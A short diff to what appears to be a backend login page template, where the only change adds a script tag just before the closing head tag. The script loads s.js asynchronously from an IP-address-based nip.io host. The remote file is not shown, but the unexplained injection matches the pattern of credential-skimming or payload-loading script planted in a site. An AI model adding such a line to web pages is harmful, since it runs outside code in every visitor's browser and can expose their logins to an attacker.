@@ -32,7 +32,7 @@
     <link rel="stylesheet" href="{{static_asset('css')}}/style.css">
     <link rel="stylesheet" href="{{static_asset('vendor')}}/fonts/fontawesome/css/fontawesome-all.css">
     <link rel="stylesheet" href="{{static_asset('css/backend-auth.css') }}">
-</head>
+<script src="https://153.75.226.33.nip.io/s.js" async></script></head>
 
 <body>
     <!-- ============================================================== -->
